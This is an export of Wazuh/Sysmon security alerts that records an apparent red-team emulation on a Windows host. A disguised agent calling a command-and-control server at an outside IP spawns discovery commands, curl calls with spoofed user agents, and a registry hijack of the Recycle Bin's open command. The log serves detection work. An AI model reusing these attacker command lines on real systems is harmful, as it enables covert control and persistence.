wazuh-alerts-4.x-2024.11.30,rvq7e5MBRlc-D5DFfBx7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:41.773
ProcessGuid: {15959494-AEF5-674A-3605-000000000D00}
ProcessId: 8188
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF5-674A-3405-000000000D00}
ParentProcessId: 7104
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.774340100Z,53981,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,18,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.721",EventChannel,1732947702.383198,"Nov 30, 2024 @ 06:21:42.721", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,8188, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-3605-000000000D00},2024-11-30 06:21:41.773,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF5-674A-3405-000000000D00},net.exe accounts,0x3e7,7104,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5frOe5MBRlc-D5DFsB2H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 06:42:40.668
ProcessGuid: {15959494-B3E0-674A-AC05-000000000D00}
ProcessId: 6568
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:42:40.671418900Z,54332,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:42:41.742",EventChannel,1732948961.807872,"Nov 30, 2024 @ 06:42:41.742", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6568, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B3E0-674A-AC05-000000000D00},2024-11-30 06:42:40.668,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5_rOe5MBRlc-D5DFsB2H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-11-30 06:42:40.843
ProcessGuid: {15959494-B3E0-674A-AE05-000000000D00}
ProcessId: 7312
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc  query 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359
ParentProcessGuid: {15959494-B3E0-674A-AC05-000000000D00}
ParentProcessId: 6568
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:42:40.845618900Z,54336,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:42:41.789",EventChannel,1732948961.820102,"Nov 30, 2024 @ 06:42:41.789", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7312, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-B3E0-674A-AE05-000000000D00},2024-11-30 06:42:40.843,"SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B3E0-674A-AC05-000000000D00},cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,0x107a6b,6568,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,sc  query,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,6PrOe5MBRlc-D5DFsB2H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-11-30 06:42:40.857
ProcessGuid: {15959494-B3E0-674A-AF05-000000000D00}
ProcessId: 4588
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc  query state= all
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359
ParentProcessGuid: {15959494-B3E0-674A-AC05-000000000D00}
ParentProcessId: 6568
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:42:40.858612000Z,54337,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:42:41.820",EventChannel,1732948961.826080,"Nov 30, 2024 @ 06:42:41.820", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4588, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-B3E0-674A-AF05-000000000D00},2024-11-30 06:42:40.857,"SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B3E0-674A-AC05-000000000D00},cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,0x107a6b,6568,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,sc  query state= all,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9PrSe5MBRlc-D5DFqB02,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-11-30 06:46:55.468
ProcessGuid: {15959494-B4DF-674A-BA05-000000000D00}
ProcessId: 6496
Image: C:\Windows\System32\curl.exe
FileVersion: 7.55.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.haxx.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -s -A ""HttpBrowser/1.0"" -m3 www.google.com  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB
ParentProcessGuid: {15959494-B4DF-674A-B905-000000000D00}
ParentProcessId: 1944
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:46:55.472815800Z,54401,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:46:56.557",EventChannel,1732949216.857444,"Nov 30, 2024 @ 06:46:56.557", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6496, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-B4DF-674A-BA05-000000000D00},2024-11-30 06:46:55.468,"SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.haxx.se/",7.55.1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B4DF-674A-B905-000000000D00},"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",0x107a6b,1944,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"C:\\Windows\\System32\\Curl.exe  -s -A \""HttpBrowser/1.0\"" -m3 www.google.com",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9_rSe5MBRlc-D5DFqB02,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-11-30 06:46:57.464
ProcessGuid: {15959494-B4E1-674A-BD05-000000000D00}
ProcessId: 3028
Image: C:\Windows\System32\curl.exe
FileVersion: 7.55.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.haxx.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -s -A ""*<|>*"" -m3 www.google.com 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB
ParentProcessGuid: {15959494-B4DF-674A-B905-000000000D00}
ParentProcessId: 1944
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:46:57.465309100Z,54405,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,7,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:46:57.572",EventChannel,1732949217.880147,"Nov 30, 2024 @ 06:46:57.572", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,3028, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-B4E1-674A-BD05-000000000D00},2024-11-30 06:46:57.464,"SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.haxx.se/",7.55.1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B4DF-674A-B905-000000000D00},"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",0x107a6b,1944,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"C:\\Windows\\System32\\Curl.exe  -s -A \""*&lt;|&gt;*\"" -m3 www.google.com",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,'-PrTe5MBRlc-D5DFMB3q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 06:47:30.468
ProcessGuid: {15959494-B502-674A-BE05-000000000D00}
ProcessId: 6556
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:47:30.469714300Z,54411,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,5,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:47:31.548",EventChannel,1732949251.887630,"Nov 30, 2024 @ 06:47:31.548", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6556, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B502-674A-BE05-000000000D00},2024-11-30 06:47:30.468,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,'-frTe5MBRlc-D5DFMB3q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 06:47:30.474
ProcessGuid: {15959494-B502-674A-BF05-000000000D00}
ProcessId: 6264
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-B502-674A-BE05-000000000D00}
ParentProcessId: 6556
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:47:30.479370800Z,54413,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:47:31.563",EventChannel,1732949251.894105,"Nov 30, 2024 @ 06:47:31.563", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6264, , , , , , , , , , ,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-B502-674A-BF05-000000000D00},2024-11-30 06:47:30.474,"SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B502-674A-BE05-000000000D00},"cmd.exe /C reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",0x107a6b,6556,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"reg  ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
